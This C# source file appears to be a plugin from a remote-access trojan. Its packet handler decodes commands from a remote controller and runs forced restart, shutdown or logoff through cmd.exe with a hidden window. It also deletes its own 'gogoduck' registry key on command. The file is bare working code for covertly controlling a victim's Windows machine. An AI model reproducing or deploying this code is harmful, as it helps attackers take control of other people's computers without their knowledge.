using System;
using System.Diagnostics;
using Leb128;
using Microsoft.Win32;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			switch ((string)LEB128.Read(data)[0])
			{
			case "Restart":
			{
				Process process3 = new Process();
				process3.StartInfo = new ProcessStartInfo
				{
					FileName = "cmd",
					Arguments = "/c Shutdown /r /f /t 00",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				};
				process3.Start();
				break;
			}
			case "Shutdown":
			{
				Process process2 = new Process();
				process2.StartInfo = new ProcessStartInfo
				{
					FileName = "cmd",
					Arguments = "/c Shutdown /s /f /t 00",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				};
				process2.Start();
				break;
			}
			case "Logoff":
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo
				{
					FileName = "cmd",
					Arguments = "/c Shutdown /l /f",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				};
				process.Start();
				break;
			}
			case "PlugClear":
				Registry.CurrentUser.DeleteSubKey("Software\\gogoduck");
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}
}
